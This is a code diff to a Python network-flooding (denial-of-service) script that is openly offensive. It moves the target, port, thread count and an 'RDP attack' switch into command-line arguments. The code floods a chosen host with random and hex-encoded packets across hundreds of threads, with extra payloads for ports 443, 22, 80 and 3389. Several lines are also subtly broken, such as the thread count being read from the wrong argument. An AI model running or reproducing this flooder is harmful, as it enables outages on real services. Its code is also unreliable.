@@ -30,18 +30,19 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
-ip = str(input('Target/t = '))
-ip = socket.gethostbyname(ip) #domain go ip
-port = int(input('Port/t = '))
-times = int(input('Time/t = '))
-th = int(input('Thread/t = '))
-choice = input("Enter 'y' or 'n': ")
-os.system('cls' if os.name == 'nt' else 'clear')
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", "--ip", required=True, type=str, help="Host or ip")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+ap.add_argument("-t", "--times", type=int, default=1000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=450, help="Threads")
+ap.add_argument("-c", "--choice", type=str, default="n", help="With attack rdp (y/n)")
+args = vars(ap.parse_args())
 ip = args['ip']
 port = args['port']
-times = times['port']
-th = times['th']
-choice = times['choice']
+times = args['times']
+th = args['times']
+choice = args['choice']
+host = socket.gethostbyname(ip)
 def randomip():
     randip1 = random.randint(3,255)
     randip2 = random.randint(3,255)
@@ -60,7 +61,7 @@ def randomip():
     randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
     return(randip)
 #socket/sock 
-def start(ip, port, times):
+def start(host, port, times):
     Attack = [
 
         codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
@@ -90,41 +91,41 @@ def start(ip, port, times):
         packets = random._urandom(5021)
         pack = random._urandom(666)
         msg = Attack[random.randrange(0,3)]
-        sock.send(pack, (ip, int(port)))    
-        sock.send(packet, (ip, int(port)))
-        sock.send(msg, (ip, int(port)))    
-        sock.send(packets, (ip, int(port)))
+        sock.send(pack, (host, int(port)))    
+        sock.send(packet, (host, int(port)))
+        sock.send(msg, (host, int(port)))    
+        sock.send(packets, (host, int(port)))
         if int(port) == 443:
-            sock.send(Attack[5],(ip,int(port)))
+            sock.send(Attack[5],(host,int(port)))
         elif int(port) == 22:
-            sock.send(Attack[4],(ip,int(port)))
+            sock.send(Attack[4],(host,int(port)))
         elif int(port) == 80:
-            sock.send(Attack[6],(ip,int(port)))
+            sock.send(Attack[6],(host,int(port)))
 
-def randsender(ip, port, times):
+def randsender(host, port, times):
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
     punch = random._urandom(int(1024))
     while time.time() < timeout:
-          sock.send(punch, (ip,int(port)))
-          sock.send(punch, (ip,int(port)))
-          sock.send(punch, (ip,int(port)))
-def stdsender(ip, times):
+          sock.send(punch, (host,int(port)))
+          sock.send(punch, (host,int(port)))
+          sock.send(punch, (host,int(port)))
+def stdsender(host, times):
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
     payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
     port = '3389'
     while time.time() < timeout:
-          sock.send(payload, (ip,int(port)))
-          sock.send(payload, (ip,int(port)))
-          sock.send(payload, (ip,int(port)))
+          sock.send(payload, (host,int(port)))
+          sock.send(payload, (host,int(port)))
+          sock.send(payload, (host,int(port)))
 
 for y in range(th):
     if choice == 'y':
-       threading.Thread(target=start, args=(ip,port,times)).start()
-       threading.Thread(target=randsender,args=(ip,port,times)).start()
-       threading.Thread(target=stdsender,args=(ip,port,times)).start()
+       threading.Thread(target=start, args=(host,port,times)).start()
+       threading.Thread(target=randsender,args=(host,port,times)).start()
+       threading.Thread(target=stdsender,args=(host,port,times)).start()
     else:
-       threading.Thread(target=start,args=(ip,port,times)).start()
-       threading.Thread(target=randsender,args=(ip,port,times)).start()
+       threading.Thread(target=start,args=(host,port,times)).start()
+       threading.Thread(target=randsender,args=(host,port,times)).start()
